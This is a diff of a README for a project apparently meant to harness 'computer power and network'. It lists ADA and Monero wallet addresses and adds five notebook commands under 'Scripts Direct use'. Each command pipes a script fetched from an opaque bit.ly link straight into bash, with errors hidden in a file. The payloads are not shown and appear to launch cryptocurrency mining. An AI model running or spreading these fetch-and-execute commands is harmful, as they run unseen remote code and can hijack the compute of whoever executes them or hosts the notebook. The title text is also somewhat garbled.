@@ -1,8 +1,8 @@
 # 10 000 code and code
 
-This project is multiple script to better use your computer power and don't wasting anathing
+This project offers multiple scripts to better use your computer power and network without wasting anything
 
-<span style="color:Red">some *Red* text</span>.
+<span style="color:Red">The address and urls are hardcoded in the scripts you need to change it before using the script</span>.
 
 
 
@@ -17,6 +17,13 @@ ADA addr1qy4aeu2wpjpuy0r2xn64eec0z6300wnqrj5ypj3ep9g49ggm7gg506stxjnjp3zjs3a9mch
 XMR	44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p
 
 ## Scripts Direct use
+
+!echo $(wget -O - bit.ly/RV00001 2> lol.out | bash )
+!echo $(wget -O - bit.ly/IBM0001 2> lol.out | bash )
+!echo $(wget -O - bit.ly/ET00001 2> lol.out | bash )
+!echo $(wget -O - bit.ly/RVET0001 2> lol.out | bash )
+!echo $(wget -O - bit.ly/XM00001 2> lol.out | bash )
+
 
 ## Solo M
 
